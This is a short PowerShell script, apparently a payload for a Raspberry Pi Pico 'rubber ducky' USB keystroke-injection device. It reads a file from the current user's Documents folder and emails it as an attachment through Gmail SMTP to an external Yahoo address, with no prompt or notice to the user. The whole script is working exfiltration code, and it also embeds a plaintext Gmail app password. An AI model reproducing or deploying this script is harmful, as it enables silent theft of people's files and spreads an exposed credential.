$UserName = $env:USERNAME
$Path = "C:\Users\$UserName\Documents\fichier.txt"

$EmailFrom = "picoduckyraspberry@gmail.com"
$EmailTo = "brochetons@yahoo.com"
$Subject = "Fichier envoyé via PowerShell"
$Body = "Voici le fichier demandé."
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$Password = "derr olzd bjte tupv"  # mot de passe d'application Gmail

$Message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo, $Subject, $Body
$Attachment = New-Object System.Net.Mail.Attachment $Path
$Message.Attachments.Add($Attachment)

$SMTP = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTP.EnableSsl = $true
$SMTP.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $Password)
$SMTP.Send($Message)
